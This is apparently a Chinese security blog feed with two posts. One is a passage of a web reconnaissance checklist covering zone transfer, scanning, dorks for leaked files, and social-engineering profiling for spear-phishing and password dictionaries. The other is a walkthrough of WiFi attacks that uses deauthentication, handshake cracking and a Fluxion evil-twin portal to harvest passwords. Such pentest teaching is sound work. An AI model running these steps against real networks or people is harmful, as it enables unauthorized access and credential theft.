<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使CA无法（或至少非常困难）为域颁发SSL证书，而该域的所有者看不到该证书；</span><br><span class="line">提供一个开放的审核和监视系统，该系统可以让任何域所有者或CA确定证书是错误的还是恶意颁发的；</span><br><span class="line">尽可能防止用户被错误或恶意颁发的证书所欺骗。</span><br></pre></td></tr></table></figure>

<p>证书透明性项目有利有弊。通过证书透明性，可以检测由证书颁发机构错误颁发的SSL证书，可以识别恶意颁发证书的证书颁发机构。因为它是一个开放的公共框架，所以任何人都可以构建或访问驱动证书透明性的基本组件，CA证书中包含了域名、子域名、邮箱等敏感信息，存在一定的安全风险。</p>
<p>利用证书透明性进行域名信息收集，一般使用CT日志搜索引擎进行域名信息收集，如在线网站：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://crt.sh/</span><br><span class="line">https://transparencyreport.google.com/</span><br><span class="line">https/certificates</span><br><span class="line">https://developers.facebook.com/tools/ct/</span><br></pre></td></tr></table></figure>

<p>本地工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfr：https://github.com/UnaPibaGeek/ctfr</span><br><span class="line">OneForAll：https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></figure>

<h3 id="DNS域传送发现子域名"><a href="#DNS域传送发现子域名" class="headerlink" title="DNS域传送发现子域名"></a><strong>DNS域传送发现子域名</strong></h3><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。目前来看”DNS域传送漏洞”已经很少了。</p>
<p>利用nmap漏洞检测脚本<code>dns-zone-transfer</code>进行检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=xxx.edu.cn -p 53 -Pn dns.xxx.edu.cn</span><br></pre></td></tr></table></figure>
<p>Linux dig 命令进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig xxx.com ns</span><br><span class="line">dig axfr @dns xxx.com</span><br></pre></td></tr></table></figure>



<p><strong>7.端口扫描</strong></p>
<p>最常用的就是nmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sS (TCP SYN扫描)</span><br><span class="line">-sT (TCP connect()扫描)</span><br><span class="line">-sU (UDP扫描)</span><br><span class="line">-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描)</span><br><span class="line">-Pn (不通过ICMP探测)	</span><br></pre></td></tr></table></figure>

<p>详细文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nmap.org/man/zh/</span><br></pre></td></tr></table></figure>

<p>其次可能还会用到masscan：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/robertdavidgraham/masscan</span><br></pre></td></tr></table></figure>

<p>常见端口及对应服务表：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442155.png" alt="图片"></p>
<h2 id="8-目录探测"><a href="#8-目录探测" class="headerlink" title="8.目录探测"></a><strong>8.目录探测</strong></h2><p>在信息搜集中，目录扫描是一个很重要的步骤，可以帮助我们获得如网站的测试页面、后台地址、常见第三方高危组件路径等。但是目前多数网站都有云waf、主机防护等，对于频繁访问的IP会封禁处理。对于云waf，找到网站真实IP是很关键的，其余的情况基本都可以修改开源工具代码利用IP代理池或控制访问频率的方式进行探测。</p>
<p>常用目录扫描工具如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">御剑目录扫描：https://github.com/foryujian/yjdirscan</span><br><span class="line">dirb：https://tools.kali.org/web-applications/dirb</span><br></pre></td></tr></table></figure>

<p>IP代理池推荐：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProxyPool：https://github.com/Python3WebSpider/ProxyPool</span><br></pre></td></tr></table></figure>

<h2 id="9-指纹识别"><a href="#9-指纹识别" class="headerlink" title="9.指纹识别"></a><strong>9.指纹识别</strong></h2><p>常见的指纹识别内容有CMS识别、框架识别、中间件识别、WAF识别。CMS识别一般利用不同的CMS特征来识别，常见的识别方式包括特定关键字识别、特定文件及路径识别、CMS网站返回的响应头信息识别等。</p>
<h3 id="服务器信息搜集"><a href="#服务器信息搜集" class="headerlink" title="服务器信息搜集"></a><strong>服务器信息搜集</strong></h3><p>服务版本识别、操作系统信息识别都可以利用nmap实现识别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 1-65535 x.x.x.x</span><br><span class="line">nmap -O x.x.x.x</span><br></pre></td></tr></table></figure>

<h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a><strong>CMS识别</strong></h3><p>识别CMS的目的在于，方便利用已公开漏洞进行渗透测试，甚至可以到对应CMS的官网下载对应版本的CMS进行本地白盒代码审计。</p>
<h4 id="特定关键字识别"><a href="#特定关键字识别" class="headerlink" title="特定关键字识别"></a><strong>特定关键字识别</strong></h4><p>CMS的首页文件、特定文件可能包含了CMS类型及版本信息，通过访问这些文件，将返回的网页信息（如<code>Powered by XXCMS</code>）与扫描工具数据库存储的指纹信息进行正则匹配，判断CMS的类型。</p>
<p>也可能前端源码中或meta标签中的content字段存在一些CMS特征信息，下图很明显能得知是WordPress框架。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442166.png" alt="图片"></p>
<h4 id="特定文件及路径识别"><a href="#特定文件及路径识别" class="headerlink" title="特定文件及路径识别"></a><strong>特定文件及路径识别</strong></h4><p>不同的CMS会有不同的网站结构及文件名称，可以通过特定文件及路径识别CMS。如WordPress会有特定的文件路径<code>/wp-admin</code>、<code>/wp-includes</code>等，有些CMS的<code>robots.txt</code>文件也可能包含了CMS特定的文件路径，与扫描工具数据库存储的指纹信息进行正则匹配，判断CMS的类型。</p>
<p>CMS会有一些JS、CSS、图片等静态文件，这些文件一般不会变化，可以利用这些特定文件的MD5值作为指纹信息来判断CMS的类型。</p>
<h4 id="响应头信息识别"><a href="#响应头信息识别" class="headerlink" title="响应头信息识别"></a><strong>响应头信息识别</strong></h4><p>应用程序会在响应头Server、X-Powered-By、Set-Cookie等字段中返回Banner信息或者自定义的数据字段，通过响应头返回的信息，可以对应用进行识别，有些WAF设备也可以通过响应头信息进行识别判断。当然Banner信息并不一定是完全准确的，应用程序可以自定义自己的Banner信息。</p>
<p>例如Shiro的响应头信息中包含<code>rememberMe</code>字段：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442167.png" alt="图片"></p>
<h4 id="指纹识别工具"><a href="#指纹识别工具" class="headerlink" title="指纹识别工具"></a><strong>指纹识别工具</strong></h4><p>指纹识别常用的工具如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb：https://github.com/urbanadventurer/WhatWeb</span><br><span class="line">wappalyzer：https://github.com/AliasIO/wappalyzer</span><br><span class="line">Glass：https://github.com/s7ckTeam/Glass</span><br></pre></td></tr></table></figure>

<p>还有两款只支持如WordPress, Joomla, Drupal的工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMSScan：https://github.com/ajinabraham/CMSScan</span><br><span class="line">CMSmap：https://github.com/Dionach/CMSmap</span><br><span class="line">云悉：https://www.yunsee.cn/</span><br><span class="line">bugscaner在线cms识别：http://whatweb.bugscaner.com/look/</span><br></pre></td></tr></table></figure>

<h2 id="10-Google-hacking"><a href="#10-Google-hacking" class="headerlink" title="10.Google hacking"></a><strong>10.Google hacking</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录遍历: site:$site intitle:index.of</span><br><span class="line"></span><br><span class="line">配置文件泄露: site:$site ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini</span><br><span class="line"></span><br><span class="line">数据库文件泄露: site:$site ext:sql | ext:dbf | ext:mdb</span><br><span class="line"></span><br><span class="line">日志文件泄露: site:$site ext:log</span><br><span class="line"></span><br><span class="line">备份和历史文件: site:$site ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup</span><br><span class="line"></span><br><span class="line">登录页面: site:$site inurl:login</span><br><span class="line"></span><br><span class="line">SQL错误: site:$site intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:&quot;Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br><span class="line"></span><br><span class="line">公开文件信息: site:$site ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"></span><br><span class="line">phpinfo(): site:$site ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br><span class="line"></span><br><span class="line">搜索粘贴站点: site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org | site:codeshare.io | site:trello.com $site</span><br></pre></td></tr></table></figure>

<p>搜索Github、Gitlab: site:github.com | site:gitlab.com $site.</p>
<h2 id="11-社工信息收集"><a href="#11-社工信息收集" class="headerlink" title="11.社工信息收集"></a><strong>11.社工信息收集</strong></h2><p>主要是对目标企业单位的关键员工、供应商和合作伙伴等相关信息进行收集。通过社工可以了解目标企业的人员组织结构，通过分析人员组织结构，能够判断关键人员并对其实施社会工程学鱼叉钓鱼攻击。收集到的相关信息还可以进行社工库查询或字典的制作，用于相关应用系统的暴力破解。</p>
<h3 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a><strong>whois信息</strong></h3><p>whois是用来查询域名的IP及所有人等信息的传输协议。whois的本质就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商），可以通过whois来实现对域名信息的查询。whois查询可以通过命令行或网页在线查询工具。</p>
<h4 id="whois命令"><a href="#whois命令" class="headerlink" title="whois命令"></a>whois命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois xxx.com</span><br></pre></td></tr></table></figure>

<p>后面的具体信息就没截出来了，可以查询域名的所有人、注册商等相关信息：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442168.png" alt="图片"></p>
<h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">站长工具whois查询：http://tool.chinaz.com/ipwhois</span><br><span class="line">爱站网whois查询：https://whois.aizhan.com/</span><br></pre></td></tr></table></figure>

<h3 id="12-社会工程学"><a href="#12-社会工程学" class="headerlink" title="12.社会工程学"></a><strong>12.社会工程学</strong></h3><p>社会工程学收集的信息有很多，包含网络ID（现用和曾用）、真实姓名、手机号、电子邮箱、出生日期、身份证号、银行卡、支付宝账号、QQ号、微信号、家庭地址、注册网站（贴吧、微博、人人网等）等信息。</p>
<p>在目标相关网页中可能会存在招聘信息、客服联系等，可以利用招聘或客服聊天的方式进行钓鱼、木马植入等。</p>
<p>搜集到相关的人员信息后可以制作社工字典，有如下在线或本地工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bugku密码攻击器：https://www.bugku.com/mima/</span><br><span class="line">白鹿社工字典生成器：https://github.com/z3r023/BaiLu-SED-Tool</span><br></pre></td></tr></table></figure>

<p>除了制作社工字典进行暴破外，还可以用已知信息进行社工库查询，涉及敏感信息了，所以不给出链接，在<code>Telegram</code>软件中充斥着大量免费或付费的社工查询。</p>
<p><strong>最后</strong></p>
<p>补充一个网址：<strong><a href="https://gitbook.se7ensec.cn/">https://gitbook.se7ensec.cn/</a></strong></p>
<p>信息收集在线工具集合网站</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86CheckList/640-16488891442169.png" alt="图片"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Wifi攻防从破解到钓鱼</title>
    <url>/posts/4f86178e.html</url>
    <content><![CDATA[<h1 id="Wifi攻防从破解到钓鱼"><a href="#Wifi攻防从破解到钓鱼" class="headerlink" title="Wifi攻防从破解到钓鱼"></a>Wifi攻防从破解到钓鱼</h1><h2 id="实战一：Aircrack-ng破解wifi"><a href="#实战一：Aircrack-ng破解wifi" class="headerlink" title="实战一：Aircrack-ng破解wifi"></a>实战一：Aircrack-ng破解wifi</h2><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p><strong>kali、USB式移动wifi（某宝搜8187无线网卡）、Aircrack-ng（kali自带）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airmon-ng</span><br><span class="line">airodump-ng</span><br><span class="line">aireplay-ng</span><br><span class="line">aircrack-ng</span><br></pre></td></tr></table></figure>

<h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><p>将无线网卡插入后连接，检查是否有网卡 <code>wlan0</code>，确保此时它没有连接任何wifi</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p>查看无线网卡状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>

<p>激活无线网卡至monitor模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>

<h3 id="探测："><a href="#探测：" class="headerlink" title="探测："></a>探测：</h3><p>利用网卡搜索附近wifi信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123115835705.png" alt="image-20220123115835705"></p>
<p>BSSID：wifi对应的mac地址</p>
<p>ENC：加密方式</p>
<p>CH：工作频道</p>
<p>STATION：连接路由器的客户端</p>
<h3 id="抓包："><a href="#抓包：" class="headerlink" title="抓包："></a>抓包：</h3><p>记录要攻击的wifi的mac地址和工作频道。执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng --ivs --bssid mac地址 -w test -c 11 wlan0mon</span><br></pre></td></tr></table></figure>

<blockquote>
<p>–bssid是路由器的mac地址</p>
<p>-w是写入到文件longas中</p>
<p>-c 11 CH频道是11</p>
<p>–ivs 是只抓取可用于破解的IVS数据报文</p>
<p>无客户端连接ap是抓不到包的</p>
</blockquote>
<h3 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h3><p>确定了信道后，新开一个shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon -c 信道</span><br></pre></td></tr></table></figure>

<p>新开一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 1 -a mac地址 -c 客户端mac地址 wlan0mon </span><br></pre></td></tr></table></figure>

<blockquote>
<p>-0 采用deauth攻击模式，后面跟上攻击次数，1-10</p>
<p>-a 后跟路由器的mac地址</p>
<p>-c 后跟客户端的mac地址</p>
</blockquote>
<p>此攻击方法需要有用户连接，攻击手段是断开对方的网络，让对方重新连接后，重新抓取握手包，对方重新连接会自动连接进入携带了密码key。</p>
<p>出现 WPA handshake:mac地址，代表抓包成功。获取到了wifi的加密密钥，按两次q推出，<strong>不要强制退出。</strong></p>
<h3 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h3><p>ivs 数据包爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w pass.txt test-01.ivs</span><br></pre></td></tr></table></figure>

<p>破解成功后，中间出现 KEY FOUND。</p>
<p>破解 cap 包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w pass.txt test-01.cap</span><br></pre></td></tr></table></figure>

<h2 id="实战二：Fluxion钓鱼破解wifi"><a href="#实战二：Fluxion钓鱼破解wifi" class="headerlink" title="实战二：Fluxion钓鱼破解wifi"></a>实战二：Fluxion钓鱼破解wifi</h2><h3 id="1-Fluxion-钓鱼2-4GHz网络"><a href="#1-Fluxion-钓鱼2-4GHz网络" class="headerlink" title="1. Fluxion-钓鱼2.4GHz网络"></a>1. Fluxion-钓鱼2.4GHz网络</h3><p>1）安装Fluxion</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shivers0x72/fluxion.git</span><br><span class="line">cd fluxion</span><br><span class="line">./fluxion.sh -i</span><br></pre></td></tr></table></figure>

<p>若出现依赖缺失问题，到 <a href="https://www.debian.org/distrib/packages">https://www.debian.org/distrib/packages</a> 下载</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123142520949.png" alt="image-20220123142520949" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123142628979.png" alt="image-20220123142628979" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123142700552.png" alt="image-20220123142700552" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123142729043.png" alt="image-20220123142729043" style="zoom:50%;" />

<p>下载完成后，安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg -i 依赖名称</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123142808870.png" alt="image-20220123142808870" style="zoom:50%;" />

<h3 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h3><p>下面的截图教你如何选择选项。</p>
<p>启动fluxion</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fluxion.sh </span><br></pre></td></tr></table></figure>

<p>选择 17 ，即中文</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123143631183.png" alt="image-20220123143631183" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123143131466.png" alt="image-20220123143131466" style="zoom:50%;" />

<p>选择<code>2</code> 出现下图</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123143254139.png" alt="image-20220123143254139" style="zoom:50%;" />

<p>选择<code>1</code> 扫描2.4GHz的信道</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123143732130.png" alt="image-20220123143732130"></p>
<p>和airmon类似的扫描，当目标出现后，关闭fluxion扫描。</p>
<p>选择攻击目标 2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123143903753.png" alt="image-20220123143903753"></p>
<p>跳过</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123143957324.png" alt="image-20220123143957324" style="zoom:50%;" />

<p>重置攻击</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123144029778.png" alt="image-20220123144029778" style="zoom:50%;" />

<p>选择 2 aireplay-ng 解除认证方式 ，速度更快</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123144105772.png" alt="image-20220123144105772" style="zoom:50%;" />

<p>这里选择1或者2都可以，但我跟随官方的建议，选择2</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123144224542.png" alt="image-20220123144224542" style="zoom:50%;" />

<p>下面都是按推荐走即可：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123144316252.png" alt="image-20220123144316252" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123144336430.png" alt="image-20220123144336430" style="zoom:50%;" />

<p>这里会出现3个小窗口</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123144416993.png" alt="image-20220123144416993" style="zoom:50%;" />

<p>关注这个窗口即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123145055656.png" alt="image-20220123145055656"></p>
<p>等待成功提示出现再进行下一步</p>
<p>选择1 </p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123150544071.png" alt="image-20220123150544071" style="zoom:50%;" />

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123150613266.png" alt="image-20220123150613266"></p>
<p>选择跳过</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123150650724.png" alt="image-20220123150650724" style="zoom:50%;" />

<p>重置攻击</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123150719610.png" alt="image-20220123150719610" style="zoom:50%;" />

<p>选择wlan0</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123150756790.png" alt="image-20220123150756790"></p>
<p>选择3，mdk3（2.4GHz选择mdk3，5GHz选择mdk4）</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123150831756.png" alt="image-20220123150831756" style="zoom:50%;" />

<p>选择1，流氓AP</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123150932422.png" alt="image-20220123150932422" style="zoom:50%;" />

<p>选择1</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123151007772.png" alt="image-20220123151007772" style="zoom:50%;" />

<p>选择 1 使用抓取到的hash文件</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123151321205.png" alt="image-20220123151321205" style="zoom: 67%;" />

<p>选择[2] cowpatty 验证 (推荐用这个)</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123151410429.png" alt="image-20220123151410429" style="zoom: 67%;" />

<p>选择[1] 创建SSL证书</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Wifi攻防从破解到钓鱼/image-20220123151446781.png" alt="image-20220123151446781" style="zoom:50%;" />

<p>选择1] 断开原网络 (推荐)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Wifi%E6%94%BB%E9%98%B2%E4%BB%8E%E7%A0%B4%E8%A7%A3%E5%88%B0%E9%92%93%E9%B1%BC/image-20220123151508397.png" alt="image-20220123151508397"></p>
<p>钓鱼界面选择</p>
<p>选择3，也可以自定义选择</p>
<p>选择3后就开始6个窗口，然后就无法连接FAST_236D了，连接此wifi的全部客户端被踢下线，并弹出六个窗口</p>
<p>1、只要输入密码，就会显示在第二框白色字体中，包含mac登录信息</p>
<p>2、弊端是客户端记住wifi密码的情况下，连接钓鱼的wifi是显示修改密码，无法跳转到钓鱼的界面。</p>
<p>3、需要一个没有机密wifi密码的客户端。连接后会调整的服务路由器，请修改密码</p>
<p>4、第五个绿色框字体会显示连接wifi的手机型号：是iphone</p>
<p>一个没有记住wifi密码的客户端连接后，钓鱼后台显示的信息</p>
<p>客户端显示的信息</p>
<p>输入正确的密码后，自动关闭其余的窗口，只留一个窗口，将显示log文件位置，log文件中包含输入正确的密码</p>
